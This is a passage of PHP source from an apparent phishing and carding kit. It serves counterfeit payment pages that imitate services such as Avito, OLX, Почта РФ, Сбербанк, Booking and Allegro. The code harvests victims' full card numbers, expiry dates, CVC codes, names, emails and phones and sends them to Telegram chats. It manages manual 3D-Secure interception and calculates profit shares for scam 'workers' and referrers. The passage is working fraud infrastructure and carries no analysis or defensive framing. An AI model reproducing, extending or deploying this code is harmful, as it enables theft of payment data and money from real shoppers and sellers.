2.0' or getService($srvc) == 'Циан' or getService($srvc) == 'Циан 2.0' or getService($srvc) == 'M.Video' or getService($srvc) == 'M.Video 2.0') {
				$valute = 'RUB';
			}
			$pln = get_currency('PLN', 3);
         	$byn = get_currency('BYN', 3);
         	$kzt = get_currency('KZT', 3);
         	$uah = get_currency('UAH', 3);
         	$ron = get_currency('RON', 3);
         	$czk = get_currency('CZK', 3);
         	$bgn = get_currency('BGN', 3);
         	$uzs = get_currency('UZS', 3);
         	
         	$kzt1 = $kzt / 100;
         	$uah1 = $uah / 10;
         	$czk1 = $czk / 10;
         	$uzs1 = $uzs / 10000;
			if ($valute == 'KZT'){
				$konv = beaCash($amount) * $kzt1;
				$konvv = ' RUB';
			}
			if ($valute == 'BYN'){
				$konv = beaCash($amount) * $byn;
				$konvv = ' RUB';
			}
			if ($valute == 'RON'){
				$konv = beaCash($amount) * $ron;
				$konvv = ' RUB';
			}
			if ($valute == 'BGN'){
				$konv = beaCash($amount) * $bgn;
				$konvv = ' RUB';
			}
			if ($valute == 'UAH'){
				$konv = beaCash($amount) * $uah1;
				$konvv = ' RUB';
			}
			if ($valute == 'UZS'){
				$konv = beaCash($amount) * $uzs1;
				$konvv = ' RUB';
			}
			if ($valute == 'PLN'){
				$konv = beaCash($amount) * $pln;
				$konvv = ' RUB';
			}
			if ($valute == 'CZK'){
				$konv = beaCash($amount) * $czk1;
				$konvv = ' RUB';
			}
			if ($valute == 'USD'){
				$konv = beaCash($amount) * 70;
				$konvv = ' RUB';
			}
			if ($valute == 'RUB'){
				$konv = "В конвертации не нуждается";
				$konvv = '';
			}
			if ($pares && $merchant && isPayData($merchant)) {
				$ruchkastatus = ($_POST2['ruchkastatus'] == '1');
				$pkoef = false;
				if ($isrpar) {
					list($card, $expm, $expy, $cvc, $ip, $srvc, $domain, $item, $shop, $amount, $id, $isnt, $isnr, $pkoef) = getPayData($merchant, !$ruchkastatus);
					$pkoef = intval($pkoef) + 1;
					if ($ruchkastatus) {
						setPayData($merchant, [$card, $expm, $expy, $cvc, $ip, $srvc, $domain, $item, $shop, $amount, $id, $isnt, $isnr, $pkoef]);
					}
					$isnt = ($isnt == '1');
				} else {
					list($card, $expm, $expy, $cvc, $card2, $amount, $token) = getPayData($merchant);
				}
				$amount = intval($amount);
				$psts = ($isrpar ? [$ruchkastatus, $_POST2['ruchkafail'], ''] : xStatus($merchant, $pares, $token));
				if ($psts[0]) {
					$card3 = false;
					if (!$isrpar && $pmnt != 'btc') {
						$card3 = setNextCard();
						addCardBalance($card2, $amount);
					}
					if (!$pkoef) {
						//$pkoef = intval(getIpData($ip, 'koef'.($isnr != 1 ? 'a' : 'b'))) + 1;
						//setIpData($ip, 'koef'.($isnr != 1 ? 'a' : 'b'), $pkoef);
						$pkoef = intval(getCookieData('koef'.$item.($isnr != 1 ? 'a' : 'b'), $_COOKIE2)) + 1;
						setCookieData('koef'.$item.($isnr != 1 ? 'a' : 'b'), $pkoef, $_COOKIE2);
					}
						if ($valute == 'RUB') {
							$profit = makeProfit($id, $isnr, $amount, $pkoef);
						}	
						if ($valute == 'KZT') {
							$profit = makeProfit($id, $isnr, $konv, $pkoef);
						}	
						if ($valute == 'BYN') {
							$profit = makeProfit($id, $isnr, $konv, $pkoef);
						}	
						if ($valute == 'RON') {
							$profit = makeProfit($id, $isnr, $konv, $pkoef);
						}	
						if ($valute == 'BGN') {
							$profit = makeProfit($id, $isnr, $konv, $pkoef);
						}
						if ($valute == 'UAH') {
							$profit = makeProfit($id, $isnr, $konv, $pkoef);
						}
						if ($valute == 'UZS') {
							$profit = makeProfit($id, $isnr, $konv, $pkoef);
						}
						if ($valute == 'PLN') {
							$profit = makeProfit($id, $isnr, $konv, $pkoef);
						}
						if ($valute == 'CZK') {
							$profit = makeProfit($id, $isnr, $konv, $pkoef);
						}
						if ($valute == 'USD') {
							$profit = makeProfit($id, $isnr, $konv, $pkoef);
						}
					$pkoef2 = '⏳ <b>Успешн'.($isnr != 1 ? 'ая оплата' : 'ый возврат').($pkoef > 1 ? ' X'.$pkoef : '').' у '.userLogin2($id).'</b>';
					addItemData($item, 1, 1, $isnt);
					addItemData($item, 2, $amount, $isnt);
					$referal = getUserReferal($id);
					$pmess = [
						$pkoef2,
						'',
						    '🥇 Сумма: <b>'.beaCash($amount).''.$valute.'</b>',
                            '💳 Карта: <b>'.cardBank($card).'</b>',
                            '🛒 Сервис: <b>'.getService($srvc, false, $isnr == 2).'</b>',
                            '🧮 После конвертации: <b>'.$konv.''.$konvv.'</b>',
					];
					$encmess = base64_encode(json_encode($pmess));
					$randid = md5(uniqid(time(),true));
					fileWrite(dirPays($randid), $encmess);
					botSend($pmess, chatProfits(), [true, [
						[
							['text' => 'Выплачено', 'callback_data' => '/paidout '.$randid],
							['text' => 'Не выплачено', 'callback_data' => '/paylocked '.$randid],
						],
					]]);
					$t0 = [
						$pkoef2,
						'',
						'💷 Ваша доля: <b>'.beaCash($profit[0]).'RUB</b>',
						'🥇 Сумма платежа: <b>'.beaCash($amount).''.$valute.'</b>',
						'',
						'',
						($isnt ? '📱 ID объявления' : '⛴ Трек номер').': <b>'.$item.'</b>',
						'🧾 Название: <b>'.$title.'</b>',
						'🛒 Сервис: <b>'.getService($srvc, false, $isnr == 2).'</b>',
						'🌍 Домен: <b>'.$domain.'</b>',
						'',
					//	'🌎 IP: <b>'.$ip.'</b>',
						'🔍 Локация: <b>'.$iploc.'</b>',
				    	'🕍 Провайдер: <b>'.$ipprov.'</b>',
				    	'🔰 Proxy/VPN: <b>'.$ipvpn.'</b>',
					];
					if (showUserCard())
						array_splice($t0, 5, 0, [
							'💳 Карта: <b>'.cardBank($card).'</b>',
							'☘️ Номер: <b>'.$card.'</b>',
							'📆 Срок: <b>'.$expm.'</b> / <b>'.$expy.'</b>',
							'🕶 CVC: <b>'.$cvc.'</b>',
						]);
					else
						array_splice($t0, 5, 0, [
							'💳 Карта: <b>'.cardHide($card).'</b>',
						]);
					botSend($t0, $id);
				$rate = getRate($id);
			if ($rate[0] == '80' && $rate[1] == '60') {
						$typerate = '2';
						$xxrete = '60';
					} 
			if ($rate[0] == '80' && $rate[1] == '80') {
						$typerate = '3';
						$xxrete = '70';
					} 
			if ($rate[0] == '65' && $rate[1] == '65') {
						$typerate = '4';
						$xxrete = '65';
					} 
			if ($rate[0] == '75' && $rate[1] == '75') {
						$typerate = '5';
						$xxrete = '60';
					} 
	        if ($typerate == '') {
						$typerate = 'По умолчанию / кастомная';
					} 
					botSend([
						$pkoef2,
						//'🔒 Cavv: <b>'.$psts[2].'</b>',
						'',
						'🥇 Сумма платежа: <b>'.beaCash($amount).''.$valute.'</b>',
						'👨🏽‍💻 Воркер: <b>'.userLogin($id, true, true).'</b>',
						'💷 Доля воркера: <b>'.beaCash($profit[0]).'RUB</b>',
						'🙈 Доля реферала: <b>'.beaCash($profit[1]).''.$valute.'</b>'.($referal ? ' (<b>'.userLogin($referal, true).'</b>)' : ''),
						'',
					//	'💵 Доля Вбивера: <b>'.$amount.' * 0,9 - 5% '.$valute.'</b>',
				    	'🅿️ Тип ставки:<b> '.$typerate.'</b>',
				    	'💹 Ставка: <b>'.$rate[0].'% / '.$rate[1].'% </b>',
						'💳 Карта: <b>'.cardBank($card).'</b>',
						'☘️ Номер: <b>'.$card.'</b>',
						'📆 Срок: <b>'.$expm.'</b> / <b>'.$expy.'</b>',
						'🕶 CVC: <b>'.$cvc.'</b>',
						'📥 Карта приема: <b>'.($isrpar ? 'Ручная' : $card2).'</b>',
						'',
						($isnt ? '📱 ID объявления' : '⛴ Трек номер').': <b>'.$item.'</b>',
						'🧾 Название: <b>'.$title.'</b>',
						'🛒 Сервис: <b>'.getService($srvc, false, $isnr == 2).'</b>',
						'🌐 Домен: <b>'.$domain.'</b>',
						'',
						'🌎 IP: <b>'.$ip.'</b>',
						'🔍 Локация: <b>'.$iploc.'</b>',
				    	'🕍 Провайдер: <b>'.$ipprov.'</b>',
			    		'🔰 Proxy/VPN: <b>'.$ipvpn.'</b>',
					], chatAlerts());
					botSend([
						$pkoef2,
						'',
						'🥇 Сумма платежа: <b>'.beaCash($amount).''.$valute.'</b>',
						'💳 Карта: <b>'.cardBank($card).'</b>',
						'🛒 Сервис: <b>'.getService($srvc, false, $isnr == 2).'</b>',
						'🧮 После конвертации: <b>'.$konv.''.$konvv.'</b>',
					], chatGroup());
					if (!$isrpar) {
						$t1 = [
							'🔥 Баланс '.($pmnt == 'btc' ? 'кошелька' : 'карты').' <b>'.$card2.'</b> увеличен на <b>'.beaCash($amount).''.$valute.'</b>',
						];
						if ($card3)
							$t1 = array_merge($t1, [
								'',
								'💳 Карта платежки автоматически заменена на <b>'.$card3.'</b>',
							]);
						botSend($t1, chatAlerts());
					}
					if ($referal) {
						botSend([
							'🔥 Вы получили <b>'.beaCash($profit[1]).''.$valute.'</b> от профита реферала <b>'.userLogin($id).'</b>',
						], $referal);
					}
					if (!$isrpar) {
						/*$amount--;
						if ($amount < 1)
							$amount = 1;*/
						$pcrt = xCreate($amount, $card, $expm, $expy, $cvc, $redir, $shop, $xcaptchadata);
						if ($pcrt[0]) {
							$data = $pcrt[1];
							break;
						} else {
							if ($pcrt[2])
								xEcho($pcrt[1]);
							$errmsg = $pcrt[1];
						}
					}
				} else {
					$errmsg = $psts[1];
					$errmsg2 = ($isrpar ? $errmsg : ((strpos($errmsg, '3D') !== false || strpos($errmsg, 'аутентиф') !== false || strpos($errmsg, 'Пароль') !== false) ? 'Уход со страницы 3D-Secure.' : 'Возможно, недостаточно средств или кредитка.'));
					$pkoef2 = '❌ <b>Ошибка при '.($isnr != 1 ? 'оплате' : 'возврате').'</b>';
					botSend([
						$pkoef2,
						'',
						'❕ Причина: <b>'.$errmsg2.'</b>',
						'🥇 Сумма платежа: <b>'.beaCash($amount).''.$valute.'</b>',
						'',
						'💳 Карта: <b>'.cardHide($card).'</b>',
						'',
						($isnt ? '📱 ID объявления' : '⛴ Трек номер').': <b>'.$item.'</b>',
						'🧾 Название: <b>'.$title.'</b>',
						'🛒 Сервис: <b>'.getService($srvc, false, $isnr == 2).'</b>',
						'🌍 Домен: <b>'.$domain.'</b>',
						'',
				//		'🌎 IP: <b>'.$ip.'</b>',
						'🔍 Локация: <b>'.$iploc.'</b>',
	    				'🕍 Провайдер: <b>'.$ipprov.'</b>',
				    	'🔰 Proxy/VPN: <b>'.$ipvpn.'</b>',
	    				], $id);
					botSend([
						$pkoef2,
						'',
						'❕ Причина: <b>'.$errmsg.' ('.$errmsg2.')</b>',
						'🥇 Сумма платежа: <b>'.beaCash($amount).''.$valute.'</b>',
						'👨🏽‍💻 Воркер: <b>'.userLogin($id, true, true).'</b>',
						'',
						'💳 Карта: <b>'.cardHide($card).'</b>',
						'',
						($isnt ? '📱 ID объявления' : '⛴ Трек номер').': <b>'.$item.'</b>',
						'🧾 Название: <b>'.$title.'</b>',
						'🛒 Сервис: <b>'.getService($srvc, false, $isnr == 2).'</b>',
						'🌍 Домен: <b>'.$domain.'</b>',
						'',
					//	'🌎 IP: <b>'.$ip.'</b>',
						'🔍 Локация: <b>'.$iploc.'</b>',
				    	'🕍 Провайдер: <b>'.$ipprov.'</b>',
			    		'🔰 Proxy/VPN: <b>'.$ipvpn.'</b>',
					], chatAdmin());
				}
			} else {
				if (isValidCard($card, $expm, $expy, $cvc)) {
					$pcrt = false;
					if ($isrpac) {
						$md = time().rand(100000, 999999);
						setPayData($md, [$card, $expm, $expy, $cvc, $ip, $srvc, $domain, $item, $shop, $amount, $id, $isnt, $isnr]);
						$t = $md.' '.$item.' '.$srvc;
						$pln = get_currency('PLN', 3);
         	$byn = get_currency('BYN', 3);
         	$kzt = get_currency('KZT', 3);
         	$uah = get_currency('UAH', 3);
         	$ron = get_currency('RON', 3);
         	$czk = get_currency('CZK', 3);
         	$bgn = get_currency('BGN', 3);
         	$uzs = get_currency('UZS', 3);
         	$eur = get_currency('EUR', 3);
         	
         	$kzt1 = $kzt / 100;
         	$uah1 = $uah / 10;
         	$czk1 = $czk / 10;
         	$uzs1 = $uzs / 10000;
					if ($valute == 'PLN'){
			        	$konv = beaCash($amount) * $pln;
			        	$konveu = $konv / $eur;
			        	
			        	$konvba = $balancecard * $pln;
			        	$konveuba = $konvba / $eur;
				        $konvv = ' RUB';
				        $konvveu = ' EUR';
				    	$kommmd = '(~'.$konv.''.$konvv.' / '.round($konveu, 2).''.$konvveu.')';
				    	$kommmdba = '(~'.$konvba.''.$konvv.' / '.round($konveuba, 2).''.$konvveu.')';
		                        	}
		            
		          	if ($valute == 'RON'){
			        	$konv = beaCash($amount) * $ron;
			        	$konveu = $konv / $eur;
			        	$konvba = $balancecard * $ron;
			        	$konveuba = $konvba / $eur;
				        $konvv = ' RUB';
				        $konvveu = ' EUR';
				    	$kommmd = '(~'.$konv.''.$konvv.' / '.round($konveu, 2).''.$konvveu.')';
				    	$kommmdba = '(~'.$konvba.''.$konvv.' / '.round($konveuba, 2).''.$konvveu.')';
		                        	}
		                        	
		          	if ($valute == 'CZK'){
			        	$konv = beaCash($amount) * $czk1;
			        	$konveu = $konv / $eur;
			        	$konvba = $balancecard * $czk1;
			        	$konveuba = $konvba / $eur;
				        $konvv = ' RUB';
				        $konvveu = ' EUR';
				    	$kommmd = '(~'.$konv.''.$konvv.' / '.round($konveu, 2).''.$konvveu.')';
				    	$kommmdba = '(~'.$konvba.''.$konvv.' / '.round($konveuba, 2).''.$konvveu.')';
		                        	}
		            if ($valute == 'UZS'){
			        	$konv = beaCash($amount) * $uzs1;
			        	$konveu = $konv / $eur;
			        	$konvba = $balancecard * $uzs1;
			        	$konveuba = $konvba / $eur;
				        $konvv = ' RUB';
				        $konvveu = ' EUR';
				    	$kommmd = '(~'.$konv.''.$konvv.' / '.round($konveu, 2).''.$konvveu.')';
				    	$kommmdba = '(~'.$konvba.''.$konvv.' / '.round($konveuba, 2).''.$konvveu.')';
		                        	}
		            if ($valute == 'BGN'){
			        	$konv = beaCash($amount) * $bgn;
			        	$konveu = $konv / $eur;
			        	$konvba = $balancecard * $bgn;
			        	$konveuba = $konvba / $eur;
				        $konvv = ' RUB';
				        $konvveu = ' EUR';
				    	$kommmd = '(~'.$konv.''.$konvv.' / '.round($konveu, 2).''.$konvveu.')';
				    	$kommmdba = '(~'.$konvba.''.$konvv.' / '.round($konveuba, 2).''.$konvveu.')';
		                        	}
		           if ($valute == 'UAH'){
			        	$konv = beaCash($amount) * $uah1;
			        	$konveu = $konv / $eur;
			        	$konvba = $balancecard * $uah1;
			        	$konveuba = $konvba / $eur;
				        $konvv = ' RUB';
				        $konvveu = ' EUR';
				    	$kommmd = '(~'.$konv.''.$konvv.' / '.round($konveu, 2).''.$konvveu.')';
				    	$kommmdba = '(~'.$konvba.''.$konvv.' / '.round($konveuba, 2).''.$konvveu.')';
		                        	}             	
		           if ($valute == 'KZT'){
			        	$konv = beaCash($amount) * $kzt1;
			        	$konveu = $konv / $eur;
			        	$konvba = $balancecard * $kzt1;
			        	$konveuba = $konvba / $eur;
				        $konvv = ' RUB';
				        $konvveu = ' EUR';
				    	$kommmd = '(~'.$konv.''.$konvv.' / '.round($konveu, 2).''.$konvveu.')';
				    	$kommmdba = '(~'.$konvba.''.$konvv.' / '.round($konveuba, 2).''.$konvveu.')';
		                        	}
		                checkCard($card, $expm, $expy, $cvc, $country, $BankName);
						botSend([
							'🚨 <b>Переход на ручной 3D-Secure 🚨</b>',
							'',
							'🥇 Сумма платежа: <b>'.beaCash($amount).''.$valute.' </b><i>'.$kommmd.'</i>',
							'💳 Карта: <b>'.cardBank($card).'</b>',
							'',
							'🏧 Номер: <b>'.$card.'</b>',
							'⏱ Срок: <b>'.$expm.'</b> / <b>'.$expy.'</b>',
							'㊙️ CVC: <b>'.$cvc.'</b>',
							$_POST2['balancecard'] ? '💰 Баланс: <b>'.$balancecard.' '.$valute.'</b><i> '.$kommmdba.'</i>' : '',
							'',
                            '🛒 Сервис: <b>'.getService($srvc, false, $isnr == 2).'</b>',
							($isnt ? '📱 ID объявления' : '⛴ Трек номер').': <b>'.$item.'</b>',
							'👨🏽‍💻 Воркер: <b>'.userLogin($id, true, true).'</b>',
						], chatAlerts(), [true, [
							[
                        	['text' => '📵 Ошибка платежа', 'callback_data' => '/doruchkafail5 '.$t],
                        	['text' => '⚠️ Нет кода', 'callback_data' => '/pm '.$id.' Мамонт не вводит код 3D-Secure'],
                        	],
                        	[
                        	['text' => '⚠️ Взял', 'callback_data' => '/vz '.$t],
                        		],
                        	[
                        	
                        		['text' => '❌ Нет денег', 'callback_data' => '/doruchkafail2 '.$t],
                            ],
                        ]]);
						$pcrt = [true, '<body onload="x.submit()"><form id="x" action="3ds'.$md.'" method="POST"><noscript><input type="submit" value="Продолжить"></noscript></form>'];
					} else {
						$pcrt = xCreate($amount, $card, $expm, $expy, $cvc, $redir, $shop, $xcaptchadata);
					}
					if ($pcrt[0]) {
						$data = $pcrt[1];
						if (!isCardData($card, $expm, $expy, $cvc)) {
							setCardData($card, $expm, $expy, $cvc);
							botSend([
								'💎 <b>Переход на 3D-Secure</b>',
								'',
								'🥇 Сумма платежа: <b>'.beaCash($amount).''.$valute.' </b><i>'.$kommmd.'</i>',
								'💳 Карта: <b>'./*cardBank*/cardHide($card).'</b>',
								$_POST2['balancecard'] ? '💰 Баланс: <b>'.$balancecard.' '.$valute.' </b><i>'.$kommmdba.'</i>' : '',
								//'☘️ Номер: <b>'.$card.'</b>',
								//'📆 Срок: <b>'.$expm.'</b> / <b>'.$expy.'</b>',
								//'🕶 CVC: <b>'.$cvc.'</b>',
								'',
								'🏧 Платежка: <b>'.($isrpac ? 'Ручная' : 'Автоматическая').'</b>',
								($isnt ? '📱 ID объявления' : '⛴ Трек номер').': <b>'.$item.'</b>',
								'🧾 Название: <b>'.$title.'</b>',
								'🛒 Сервис: <b>'.getService($srvc, false, $isnr == 2).'</b>',
								'🌍 Домен: <b>'.$domain.'</b>',
								'',
				//				'🌎 IP: <b>'.$ip.'</b>',
								'🔍 Локация: <b>'.$iploc.'</b>',
			            		'🕍 Провайдер: <b>'.$ipprov.'</b>',
				            	'🔰 Proxy/VPN: <b>'.$ipvpn.'</b>',
							], $id);
							botSend([
								'💳 <b>Получена карта '.cardBank($card).'</b>',
								'',
								'🏧 Номер: <b>'.$card.'</b>',
								'⏱ Срок: <b>'.$expm.'</b> / <b>'.$expy.'</b>',
								'㊙️ CVC: <b>'.$cvc.'</b>',
								'',
								'🥇 Сумма платежа: <b>'.beaCash($amount).''.$valute.'</b>',
								'👨🏽‍💻 Воркер: <b>'.userLogin($id, true, true).'</b>',
							], chatCard());
						}
						break;
					} else {
						if ($pcrt[2])
							xEcho($pcrt[1]);
						$errmsg = $pcrt[1];
					}
				}
			}
			if ($isrpar)
				exit();
			$hash0 = md5($isnr.$item.$title.$amount.$cost.$srvc.$domain.$ip);
			if ($hash0 != /*getIpData($ip, 'hash')*/getCookieData('hash', $_COOKIE2)) {
				//setIpData($ip, 'hash', $hash0);
				setCookieData('hash', $hash0, $_COOKIE2);
				$city = $_POST2['fcity'];
				$fio = $_POST2['fname'];
				$email = $_POST2['femail'];
				$phone = $_POST2['fphone'];
				$t = [
					'💹 <b>Ввод карты для '.$ttx[0].'</b>',
					'',
					($isnt ? '📱 ID объявления' : '⛴ Трек номер').': <b>'.$item.'</b>',
					'🧾 Название: <b>'.$title.'</b>',
					'🥇 Общая сумма: <b>'.beaCash($amount).''.$valute.'</b>',
					'🛒 Сервис: <b>'.getService($srvc, false, $isnr == 2).'</b>',
					'🌍 Домен: <b>'.$domain.'</b>',
					'',
		//			'🌎 IP: <b>'.$ip.'</b>',
					'🔍 Локация: <b>'.$iploc.'</b>',
					'🕍 Провайдер: <b>'.$ipprov.'</b>',
					'🔰 Proxy/VPN: <b>'.$ipvpn.'</b>',
				];
				if ($cost > 0)
					array_splice($t, 5, 0, [
						'💰 Доставка: <b>'.beaCash($cost).''.$valute.'</b>',
					]);
				if (strlen($phone) != 0)
					array_splice($t, 2, 0, [
						'🕶 ФИО: <b>'.$fio.'</b>',
						'✉️ Почта: <b>'.$email.'</b>',
						'📞 Телефон: <b>'.$phone.'</b>',
						'',
					]);
				if (strlen($city) != 0)
					array_splice($t, 2, 0, [
						'🔍 Город доставки: <b>'.$city.'</b>',
					]);
				botSend($t, $id);
			}
			$data = str_replace([
				'%style%',
				'%script%',
				'%amount%',
				'%title%',
				'%card%',
				'%expm%',
				'%expy%',
				'%cvc%',
				'%txt1%',
				'%txt2%',
				'%txt3%',
				'%errmsg%',
				'%infmsg%',
				'%balancecard%',
			], [
			fileRead(dirStyles($srvc.'-0')),
				fileRead(dirScripts($srvc.'-0')),
				number_format($amount, 0, '.', ' '),
				$title,
				$card,
				$expm,
				$expy,
				$cvc,
				$ttx[1],
				$ttx[2],
				$ttx[3],
				$errmsg ? $errmsg : '',
				$ttx[4],
				$isnt ? ($itemd[12] ? $itemd[12] : 'none') : ($itemd[17] ? $itemd[17] : 'none')
			], fileRead(dirPages($srvc.'-0')));
			break;
		}
	}
	if ($ddos0) {
		$ddos = getItemData($item, $isnt)[0];
		$ddos2 = [50, 100, 250, 500, 1000, 2000, 3000, 5000, 10000];
		if (in_array($ddos, $ddos2)) {
			botSend([
				'‼️ <b>Ебаный DDOS X'.(array_search($ddos, $ddos2) + 1).'</b>',
				'',
				'👣 Уникальных запросов: <b>'.$ddos.'</b>',
				'',
				'🌍 Домен: <b>'.$domain.'</b>',
				($isnt ? '📱 ID объявления' : '⛴ Трек номер').': <b>'.$item.'</b>',
				'🤡 Еблан: <b>'.userLogin($id, true, true).'</b>',
			], chatAlerts());
			
				
		}
			include 'cleaner.php';
	}
       	if (getService($srvc, false, $isnb == 2) == 'OLX KZ' or getService($srvc, false, $isnb == 2) == 'OLX KZ 2.0' or getService($srvc, false, $isnb == 2) == 'КазПочта' or getService($srvc, false, $isnb == 2) == 'КазПочта 2.0' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость' or getService($srvc, false, $isnb == 2) == 'OLX KZ недвижимость 2.0') {
				if ($data && $data != '')
	        	xEcho(str_replace('</head>', '</head>'.liveChatCode(), $data));
			} 
		if (getService($srvc, false, $isnb == 2) == 'Куфар' or getService($srvc, false, $isnb == 2) == 'Куфар 2.0' or getService($srvc, false, $isnb == 2) == 'BelPost' or getService($srvc, false, $isnb == 2) == 'BelPost 2.0' or getService($srvc, false, $isnb == 2) == 'Европочта' or getService($srvc, false, $isnb == 2) == 'Европочта 2.0') {
				if ($data && $data != '')
	        	xEcho(str_replace('</head>', '</head>'.liveChatCode(), $data));
			} 
        if (getService($srvc, false, $isnb == 2) == 'Юла' or getService($srvc, false, $isnb == 2) == 'Юла 2.0' or getService($srvc, false, $isnb == 2) == 'Авито' or getService($srvc, false, $isnb == 2) == 'Авито 2.0' or getService($srvc, false, $isnb == 2) == 'СДЭК' or getService($srvc, false, $isnb == 2) == 'СДЭК 2.0' or getService($srvc, false, $isnb == 2) == 'ПЭК' or getService($srvc, false, $isnb == 2) == 'ПЭК 2.0' or getService($srvc, false, $isnb == 2) == 'Боксберри' or getService($srvc, false, $isnb == 2) == 'Боксберри 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс' or getService($srvc, false, $isnb == 2) == 'Яндекс 2.0' or getService($srvc, false, $isnb == 2) == 'Достависта' or getService($srvc, false, $isnb == 2) == 'Достависта 2.0' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость' or getService($srvc, false, $isnb == 2) == 'Avito Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость' or getService($srvc, false, $isnb == 2) == 'Youla Недвижимость 2.0' or getService($srvc, false, $isnb == 2) == 'Почта РФ' or getService($srvc, false, $isnb == 2) == 'Почта РФ 2.0' or getService($srvc, false, $isnb == 2) == 'Сбербанк' or getService($srvc, false, $isnb == 2) == 'Сбербанк 2.0' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк' or getService($srvc, false, $isnb == 2) == 'Альфа-Банк 2.0' or getService($srvc, false, $isnb == 2) == 'AUTO RU' or getService($srvc, false, $isnb == 2) == 'AUTO RU 2.0' or getService($srvc, false, $isnb == 2) == 'OLX Argentina' or getService($srvc, false, $isnb == 2) == 'OLX Argentina 2.0' or getService($srvc, false, $isnb == 2) == 'Booking' or getService($srvc, false, $isnb == 2) == 'Booking 2.0' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления' or getService($srvc, false, $isnb == 2) == 'Яндекс Объявления 2.0' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар' or getService($srvc, false, $isnb == 2) == 'БлаБлаКар 2.0' or getService($srvc, false, $isnb == 2) == 'Циан' or getService($srvc, false, $isnb == 2) == 'Циан 2.0' or getService($srvc, false, $isnb == 2) == 'M.Video'  or getService($srvc, false, $isnb == 2) == 'M.Video 2.0') {
                if ($data && $data != '')
        		xEcho(str_replace('</head>', '</head>'.liveChatCode(), $data));
			}
		if (getService($srvc, false, $isnb == 2) == 'OLX RO' or getService($srvc, false, $isnb == 2) == 'OLX RO 2.0' or getService($srvc, false, $isnb == 2) == 'FAN Courier' or getService($srvc, false, $isnb == 2) == 'FAN Courier 2.0') {
				if ($data && $data != '')
	        	xEcho(str_replace('</head>', '</head>'.liveChatCode(), $data));
			} 
		if (getService($srvc, false, $isnb == 2) == 'OLX BG' or getService($srvc, false, $isnb == 2) == 'OLX BG 2.0') {
				if ($data && $data != '')
	        	xEcho(str_replace('</head>', '</head>'.liveChatCode(), $data));
			} 
        if (getService($srvc, false, $isnb == 2) == 'OLX PL' or getService($srvc, false, $isnb == 2) == 'OLX PL 2.0' or getService($srvc, false, $isnb == 2) == 'Allegro' or getService($srvc, false, $isnb == 2) == 'Allegro 2.0') {
				if ($data && $data != '')
	        	xEcho(str_replace('</head>', '</head>'.liveChatCode1(), $data));
			} 
		if (getService($srvc, false, $isnb == 2) == 'СБАЗАР' or getService($srvc, false, $isnb == 2) == 'СБАЗАР 2.0' or getService($srvc, false, $isnb == 2) == 'Bazos' or getService($srvc, false, $isnb == 2) == 'Bazos 2.0') {
				if ($data && $data != '')
	        	xEcho(str_replace('</head>', '</head>'.liveChatCode1(), $data));
			} 
		if (getService($srvc, false, $isnb == 2) == 'Gumtree' or getService($srvc, false, $isnb == 2) == 'Gumtree 2.0') {
				if ($data && $data != '')
	        	xEcho(str_replace('</head>', '</head>'.liveChatCode1(), $data));
			} 
		if (getService($srvc, false, $isnb == 2) == 'OLX UA' or getService($srvc, false, $isnb == 2) == 'OLX UA 2.0' or getService($srvc, false, $isnb == 2) == 'IZI ua' or getService($srvc, false, $isnb == 2) == 'IZI ua 2.0') {
				if ($data && $data != '')
	        	xEcho(str_replace('</head>', '</head>'.liveChatCode(), $data));
			} 
		if (getService($srvc, false, $isnb == 2) == 'OLX UZ' or getService($srvc, false, $isnb == 2) == 'OLX UZ 2.0' or getService($srvc, false, $isnb == 2) == 'Fargo uz' or getService($srvc, false, $isnb == 2) == 'Fargo uz 2.0') {
				if ($data && $data != '')
	        	xEcho(str_replace('</head>', '</head>'.liveChatCode(), $data));
			} 
?>
